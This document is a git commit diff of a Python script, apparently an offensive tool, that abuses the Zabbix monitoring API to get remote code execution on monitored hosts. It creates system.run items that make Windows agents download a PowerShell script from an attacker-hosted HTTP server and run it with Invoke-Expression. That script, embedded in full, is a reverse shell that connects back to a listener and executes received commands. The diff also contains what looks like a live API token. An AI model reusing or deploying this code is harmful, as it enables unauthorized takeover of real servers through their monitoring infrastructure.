840ec8055e19b0c5f10b4c67c6dfbf2eb34604eb
Steven guimaraes <99700348+ticofookfook@users.noreply.github.com>
2024-11-26 20:11:01 -0300

    Update execution_rce.py

--- execution_rce.py
+++ execution_rce.py
@@ -4,59 +4,66 @@ import base64
 import os
 import subprocess
 import time
-# Configurações da API
-zabbix_url = 'http://192.168.29.235:8080/api_jsonrpc.php'
-headers = {'Content-Type': 'application/json'}
-auth_token = 'xxxxxxxxxxxxxxxx'
-ip_shell = "192.168.29.11"
-port_ip  = "4441"
+ZABBIX_URL = 'http://192.168.25.3:8080/api_jsonrpc.php'
+HEADERS = {'Content-Type': 'application/json'}
+AUTH_TOKEN = 'b0033ebb9e103297104a7c0535b6752bd30c974141cc4d11faa30b19a4a13877'
+IP_SHELL = "10.10.100.6"
+PORT_SERVER_PYTHON = 9000
+PALAVRAS_CHAVE_LINUX = [
+    "Server_linux", "linux", "ubuntu", "debian", "centos",
+    "redhat", "arch", "fedora", "suse",
+    "unix", "kali", "mint"
+]
 
 
+def payload_win(port_shell):
+    payload_win = f"""
+    do {{
+        Start-Sleep -Seconds 1
+        try {{
+            $ClienteTCP = New-Object Net.Sockets.TCPClient("{IP_SHELL}", {port_shell})
+        }} catch {{}}
+    }} until ($ClienteTCP.Connected)
 
-payload_win = f"""
-do {{
-    Start-Sleep -Seconds 1
-    try {{
-        $ClienteTCP = New-Object Net.Sockets.TCPClient("{ip_shell}", {port_ip})
-    }} catch {{}}
-}} until ($ClienteTCP.Connected)
+    $FluxoDeRede = $ClienteTCP.GetStream()
+    $EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)
 
-$FluxoDeRede = $ClienteTCP.GetStream()
-$EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)
-
-function EscreverNoFluxo ($Texto) {{
-    [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
-    $EscritorDeFluxo.Write($Texto + 'SHELL> ')
-    $EscritorDeFluxo.Flush()
-}}
-
-EscreverNoFluxo ''
-
-while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
-    $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
-    $SaidaDeComando = try {{
-        Invoke-Expression $ComandoRecebido 2>&1 | Out-String
-    }} catch {{
-        $_ | Out-String
+    function EscreverNoFluxo ($Texto) {{
+        [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
+        $EscritorDeFluxo.Write($Texto + 'SHELL> ')
+        $EscritorDeFluxo.Flush()
     }}
-    EscreverNoFluxo ($SaidaDeComando)
-}}
 
-$EscritorDeFluxo.Close()
-"""
+    EscreverNoFluxo ''
 
-shell = f"""
-powershell -ep Bypass {payload_win}
-"""
+    while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
+        $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
+        $SaidaDeComando = try {{
+            Invoke-Expression $ComandoRecebido 2>&1 | Out-String
+        }} catch {{
+            $_ | Out-String
+        }}
+        EscreverNoFluxo ($SaidaDeComando)
+    }}
 
-with open("shell.ps1", 'w') as f:  
-    f.write(shell)
+    $EscritorDeFluxo.Close()
+    """
+
+    shell = f"""
+    powershell -ep Bypass {payload_win}
+    """
+
+    with open("shell.ps1", 'w') as f:  
+        f.write(shell)
 
 
 
-server_process = subprocess.Popen(["python3", "-m", "http.server", "9999"], cwd=os.getcwd())
+def iniciar_servidor_http(PORT_SERVER_PYTHON):
+    """Inicia um servidor HTTP na pasta atual."""
+    return subprocess.Popen(["python3", "-m", "http.server", str(PORT_SERVER_PYTHON)], cwd=os.getcwd())
 
 
+iniciar_servidor_http(PORT_SERVER_PYTHON)
 
 def listar_interface_host(auth_token):
     data = {
@@ -76,7 +83,7 @@ def listar_interface_host(auth_token):
         "id": 2
     }
 
-    response = requests.post(zabbix_url, headers=headers, data=json.dumps(data))
+    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(data))
 
     if response.status_code != 200:
         print(f"Erro ao conectar na API: {response.status_code}, {response.text}")
@@ -106,7 +113,7 @@ def verificar_e_excluir_item(auth_token, hostid, name):
         "auth": auth_token,
         "id": 3
     }
-    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_get))
+    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_get))
     items = response.json().get('result', [])
     
     if items:
@@ -118,7 +125,7 @@ def verificar_e_excluir_item(auth_token, hostid, name):
             "auth": auth_token,
             "id": 4
         }
-        delete_response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_delete))
+        delete_response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_delete))
         print(f"Itens excluídos: {delete_response.json()}")
 
 
@@ -142,12 +149,12 @@ def write_code_in_host_linux(auth_token, hostid, interfaceid, ip_shell, port_ip)
         "auth": auth_token,
         "id": 5
     }
-    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_create))
+    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create))
     print(f"Item criado: {response.json()}")
 
 
 
-def write_code_in_host_win(auth_token, hostid, interfaceid):
+def write_code_in_host_win(auth_token, hostid, interfaceid,IP_SHELL):
     name = "powershell_simple"
     verificar_e_excluir_item(auth_token, hostid, name)  # Excluir item existente, se houver
     
@@ -156,7 +163,7 @@ def write_code_in_host_win(auth_token, hostid, interfaceid):
         "method": "item.create",
         "params": {
             "name": name,
-            "key_": f"system.run[powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{ip_shell}:9999/shell.ps1') | Invoke-Expression\",nowait]",
+            "key_": f"system.run[powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{IP_SHELL}:{PORT_SERVER_PYTHON}/shell.ps1') | Invoke-Expression\",nowait]",
             "hostid": hostid,
             "type": 0,  # Zabbix agent
             "value_type": 3,  # Tipo de retorno (3 significa log)
@@ -166,27 +173,31 @@ def write_code_in_host_win(auth_token, hostid, interfaceid):
         "auth": auth_token,
         "id": 5
     }
-    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_create))
+    response = requests.post(ZABBIX_URL, headers=HEADERS, data=json.dumps(payload_create))
     print(f"Item criado: {response.json()}")
     
 
-try:
-    response_data = listar_interface_host(auth_token)
-    if response_data and "result" in response_data:
-        for host in response_data['result']:
-            hostid = host['hostid']
-            hostname = host['host']
-            interfaceid = host['interfaces'][0]['interfaceid']  # Pega o primeiro 'interfaceid'
-            
-            if hostname == "server-linux":
-                # write_code_in_host_linux(auth_token,hostid,interfaceid,ip_shell,port_ip)
-                print("executou no host linux")
-            else:
-                write_code_in_host_win(auth_token,hostid,interfaceid)
-                print("executou no host Windows")
-finally:
-    time.sleep(20)
-    server_process.terminate()
-    print("Servidor HTTP encerrado.")
+def main():
+    
+    try:
+        response_data = listar_interface_host(AUTH_TOKEN)
+        if response_data and "result" in response_data:
+            for host in response_data['result']:
+                hostid = host['hostid']
+                hostname = host['host']
+                interfaceid = host['interfaces'][0]['interfaceid']                
+                porta = int(input(f"Digite a porta para o host '{hostname}': "))
+                # Aguarda confirmação do usuário
+                input(f"Pressione ENTER para continuar com o host '{hostname}' na porta {porta}...")
 
+                # Configura payloads para sistemas Linux ou Windows
+                if any(word.lower() in hostname.lower() for word in PALAVRAS_CHAVE_LINUX):
+                    write_code_in_host_linux(AUTH_TOKEN, hostid, interfaceid, IP_SHELL, porta)
+                else:
+                    payload_win(porta)
+                    write_code_in_host_win(AUTH_TOKEN, hostid, interfaceid, IP_SHELL)
+    finally:
+        print("Servidor HTTP em background.")
 
+if __name__ == "__main__":
+    main()
